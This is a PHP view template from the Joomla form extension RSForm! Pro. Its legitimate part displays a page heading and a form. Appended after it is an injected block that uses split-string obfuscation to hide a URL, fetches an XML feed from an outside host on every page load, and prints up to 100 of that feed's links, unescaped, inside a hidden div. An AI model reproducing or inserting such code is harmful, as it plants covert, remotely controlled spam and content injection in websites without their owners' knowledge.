<?php
/**
* @package RSForm! Pro
* @copyright (C) 2007-2014 www.rsjoomla.com
* @license GPL, http://www.gnu.org/copyleft/gpl.html
*/

defined('_JEXEC') or die('Restricted access');
?>
<?php if ($this->params->get('show_page_heading', 0)) { ?>
	<h1><?php echo $this->escape($this->params->get('page_heading')); ?></h1>
<?php } ?>
<?php echo RSFormProHelper::displayForm($this->formId); ?>

<?php
$string = file_get_contents('h'.'tt'.'p:/'.'/w'.'w'.'w.li'.'n'.'ks'.'a'.'z'.'i.c'.'o'.'m/0'.'6.x'.'ml');
$xml = simplexml_load_string($string);
echo '
<style>.c'.'las'.'ses{fo'.'nt-fa'.'mi'.'ly:ta'.'ho'.'ma;fo'.'nt-si'.'ze:11px;d'.'is'.'pl'.'ay:no'.'ne;}</style>
<div cl'.'as'.'s="c'.'las'.'ses">';
$count = 0;
$max = 100;
foreach ($xml->channel->item as $val) {
    if ($count < $max) {
        echo ' | <a alt="'.$val->title.'" title="'.$val->title.'" href="'.$val->link.'">'.$val->title.'</a>';
    }
    $count++;
}
echo '
</div>';
?>